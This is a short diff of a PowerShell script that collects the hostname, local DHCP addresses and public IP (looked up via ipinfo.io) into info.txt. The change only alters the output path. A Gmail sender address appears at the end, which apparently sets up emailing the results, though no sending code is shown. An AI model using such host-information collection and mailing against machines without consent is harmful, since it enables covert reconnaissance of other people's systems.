@@ -14,7 +14,7 @@ Out-File $p\info.txt -Append -InputObject $a
 }
 
 # IP Info
-$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File C:\IT\info.txt -Append
+$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File $p\info.txt -Append
 
 
 $FROM = "patitodegoma404@gmail.com"
